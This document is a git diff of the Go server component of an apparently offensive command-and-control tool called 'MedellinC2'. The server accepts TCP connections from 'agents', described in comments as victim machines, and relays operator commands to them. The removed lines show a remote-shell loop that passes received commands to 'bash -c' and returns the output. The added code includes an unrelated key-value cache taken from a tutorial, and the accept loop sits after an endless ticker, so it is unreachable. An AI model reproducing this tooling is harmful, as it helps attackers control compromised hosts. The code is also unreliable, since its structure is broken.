@@ -12,8 +12,10 @@ import (
 	"net"
 	"os"
 	"strings"
+	"sync"
 	"time"
 
+	"github.com/google/uuid"
 	"github.com/megatop1/MedellinC2/data"
 	"github.com/spf13/cobra"
 )
@@ -45,21 +47,20 @@ func init() {
 }
 
 //TESTING
-func handleClientRequest(con net.Conn) {
-	//fancy colors for console output
-	//colorGreen := "\033[32m"
+var (
+	con net.Conn
+)
 
+func handleClientRequest(con net.Conn) {
 	defer con.Close()
 
-	/* On the TCP server (C2), print below message once a TCP Client (agent) has successfully connected */
 	clientReader := bufio.NewReader(con)
-	/*
-		fmt.Println(string(colorGreen), "A new agent has successfully connected")
-		getAgentInfo() //get the information such as IP, Hostname, OS of an agent (victim machine)
-		data.CheckDuplicateAgentUUID()
-	*/
+
 	if data.CheckDuplicateAgentUUID() == true {
-		go getAgentInfo()
+		/*Generate Agent in DB */
+		go getAgentInfoAndGenerateAgent()
+
+		/* Issue Commands Remotely */
 		for {
 			reader := bufio.NewReader(os.Stdin)
 			fmt.Print(">> ")
@@ -101,48 +102,139 @@ func handleClientRequest(con net.Conn) {
 			//sendRemoteCommand(con)
 			log.Printf("failed to respond to client: %v\n", err)
 		}
-
-		//Write code to assign the connection to an agent
-
-		//COMMANDS TO GIVE REMOST HOST A SHELL
-		/*
-			for {
-				attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
-				cmd := exec.Command("bash", "-c", attackerCommands)
-				if err != nil {
-					log.Fatalln(err)
-				}
-				out, _ := cmd.CombinedOutput()
-
-				con.Write(out)
-			} */
-		//if connection closes after some commands were ran print to server console
 	}
 }
 
 func server() {
 	println(logo)
-
+	/*Start the TCP Server */
 	listener, err := net.Listen("tcp", "0.0.0.0:8000") //start TCP server on 8000
 	if err != nil {
 		log.Fatalln(err)
 	}
 	defer listener.Close()
-	printCurrentListerPorts() //Print open listeners on startup of the C2 server
-	//time.Sleep((2 * time.Second))
+
+	/* Print below message upon successful start of the TCP Server */
+	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
+
+	/* Print open listeners on startup of C2 server */
+	printCurrentListerPorts()
+
+	/* Run continuously in background to keep checking if any new listeners were created */
 	for range time.Tick(time.Second * 10) {
 		checkListenerPorts()
 	}
-	//go data.CheckDuplicateAgentUUID() //check for duplicate agent UUIDs in the DB
-	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
+
+	/* Using sync.Map to not deal with concurrency slice/map issues */
+	var connMap = &sync.Map{}
+
+	/* Accept Connections */
+
 	for {
 		con, err := listener.Accept()
 		if err != nil {
 			log.Println(err)
 			continue
 		}
+
+		id := uuid.New().String()
+		connMap.Store(id, con)
+
+		/* Handle incoming connections by starting goroutine for each connected client */
 		go handleClientRequest(con)
 	}
+}
+
+type cache struct {
+	data map[string]string
+	*sync.RWMutex
+}
+
+var c = cache{data: make(map[string]string), RWMutex: &sync.RWMutex{}}
+
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+
+	s := bufio.NewScanner(conn)
+
+	for s.Scan() {
+
+		data := s.Text()
+
+		if data == "" {
+			conn.Write([]byte(">"))
+			continue
+		}
+
+		if data == "exit" {
+			return
+		}
+
+		handleCommand(data, conn)
+	}
+}
+
+var InvalidCommand = []byte("Invalid Command")
+
+func handleCommand(inp string, conn net.Conn) {
+	str := strings.Split(inp, " ")
+
+	if len(str) <= 0 {
+		conn.Write(InvalidCommand)
+		return
+	}
+
+	command := str[0]
+
+	switch command {
+
+	case "GET":
+		get(str[1:], conn)
+	case "SET":
+		set(str[1:], conn)
+	default:
+		conn.Write(InvalidCommand)
+	}
+
+	conn.Write([]byte("\n>"))
+}
+
+func set(cmd []string, conn net.Conn) {
+
+	if len(cmd) < 2 {
+		conn.Write(InvalidCommand)
+		return
+	}
+
+	key := cmd[0]
+	val := cmd[1]
+
+	c.Lock()
+	c.data[key] = val
+	c.Unlock()
+
+	conn.Write([]byte("OK"))
+}
+
+func get(cmd []string, conn net.Conn) {
+
+	if len(cmd) < 1 {
+		conn.Write(InvalidCommand)
+		return
+	}
+
+	val := cmd[0]
+
+	c.RLock()
+	ret, ok := c.data[val]
+	c.RUnlock()
+
+	if !ok {
+		conn.Write([]byte("Nil"))
+		return
+	}
+
+	conn.Write([]byte(ret))
 }
 
 // http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
